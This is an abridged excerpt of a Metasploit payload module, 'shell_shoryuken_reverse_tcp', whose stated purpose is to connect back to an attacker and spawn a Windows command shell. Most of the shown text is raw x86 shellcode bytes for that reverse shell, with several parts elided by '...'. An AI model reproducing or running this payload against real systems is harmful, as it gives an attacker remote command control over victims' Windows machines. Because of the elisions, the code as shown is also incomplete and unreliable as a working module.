## 
#  $Id: shell_shoryuken_reverse_tcp.rb,v 1.6 2011-03-21 17:26:46-03 nbrito Exp $
##
...
module Metasploit3
	...
	def initialize(info = {})
		super(merge_info(info,
			...
			'Description'   => 'Connect back to attacker and spawn a command shell  (Shoryuken)',
			'Author'        => [ 'Nelson Brito' ],
			'License'       => 'GPLv2',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			...
			'Payload'       =>
				{
					...
					'Payload' =>
						...
						"\x4E\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\xE8\x15\x00\x00\x00" +
						"\x43\x4D\x44\x20\x2F\x6B\x20\x73\x65\x74\x20\x44\x49\x52\x43\x4D" +
						"\x44\x3D\x2F\x62\x00\x5B\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2" +
						"\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54" +
						"\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86" +
						"\xFF\xD5\x89\xE0\x4E\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5" +
